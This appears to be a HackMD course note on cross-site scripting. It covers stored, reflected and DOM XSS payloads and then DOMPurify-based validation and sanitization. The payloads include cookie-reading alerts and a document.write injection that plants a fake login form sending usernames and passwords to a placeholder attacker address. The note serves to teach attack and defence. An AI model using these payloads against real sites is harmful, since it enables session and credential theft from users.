
[![hackmd-github-sync-badge](https://hackmd.io/qK4OEeKlSUuvmWVzvrKJ2Q/badge)](https://hackmd.io/qK4OEeKlSUuvmWVzvrKJ2Q)
## [<span style=color:darkred>**Vulnerability Details**</span>](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#vulnerability-details)

### <span style=color:red>Stored (Persistent) XSS</span>
#### Payload
```javascript!
<script>alert(window.origin)</script>
```
```javascript!
<script>print()</script>
```
```javascript!
<script>alert(document.cookie)</script>
```

### <span style=color:darkred>Non-Persistent</span>
``Must employ Social Engineer and specific URL to lure victim click``
### <span style=color:red>Reflected XSS</span>
#### Payload
```javascript
http://SERVER_IP:PORT/index.php?task=<script>alert(window.origin)</script>
```
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

### <span style=color:red>DOM (Document Object Model) XSS</span>
#### Payload
```javascript
<img src="" onerror=alert(document.cookie)>
```
---
##  [<span style=color:>**DOMPurify**</span>](https://github.com/cure53/DOMPurify#dompurify)

### <span style=color:darkblue>From-End</span>
#### Input validation
```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```
#### Input Sanitization
```javascript
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
}
```

### <span style=color:darkblue>Back-End</span>
#### Input validation
``
For a NodeJS back-end, we can use the same JavaScript code mentioned earlier for the front-end.
``

#### Input Sanitization
```javascript
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```